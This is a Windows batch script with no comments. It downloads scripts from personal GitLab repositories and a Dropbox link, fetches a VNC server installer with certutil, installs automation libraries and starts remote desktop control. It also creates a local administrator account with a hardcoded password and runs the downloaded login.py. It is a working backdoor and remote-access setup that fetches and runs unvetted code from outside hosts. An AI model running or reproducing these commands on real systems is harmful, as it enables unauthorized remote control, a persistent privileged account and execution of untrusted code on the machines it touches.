@echo off
curl -L -o login.py https://gitlab.com/rifqiekhafi/spoell/-/raw/main/login.py?inline=false
curl -L -o loop.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/loop.bat?inline=false
curl -L -o show.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/show.bat?inline=false
certutil -urlcache -split -f "https://downloads.realvnc.com/download/file/vnc.files/VNC-Server-7.10.0-Windows.exe" VNC-Server-7.10.0-Windows.exe
pip install pyautogui --quiet
pip install psutil --quiet
start "" "VNC-Server-7.10.0-Windows.exe"
net user /add golinta Rumah0102
net localgroup administrators golinta /add
curl -s -L -o time.py https://www.dropbox.com/scl/fi/ox42qglbf6fsnm9erf8cw/timelimit.py?rlkey=opyeqgum1k95kud81xlc7d66r&dl=0
python login.py
